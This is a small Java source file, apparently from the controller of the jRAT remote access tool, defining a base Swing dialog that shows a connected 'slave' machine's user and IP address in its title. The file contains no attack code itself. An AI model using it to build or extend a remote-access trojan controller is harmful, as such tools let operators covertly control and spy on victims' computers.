package se.jrat.controller.ui.dialogs;

import javax.swing.JDialog;

import se.jrat.controller.Slave;

import com.redpois0n.oslib.OperatingSystem;


@SuppressWarnings("serial")
public abstract class BaseDialog extends JDialog {

	protected Slave slave;
	
	public BaseDialog(Slave slave) {
		this.slave = slave;
	}

	@Override
	public void setVisible(boolean t) {
		super.setVisible(true);

		if (OperatingSystem.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
			super.pack();
		}
	}
	
	public void setTitle(String s) {
		super.setTitle(s + " - [" + slave.formatUserString() + "] - " + slave.getIP());
	}
	
	public Slave getSlave() {
		return slave;
	}

}
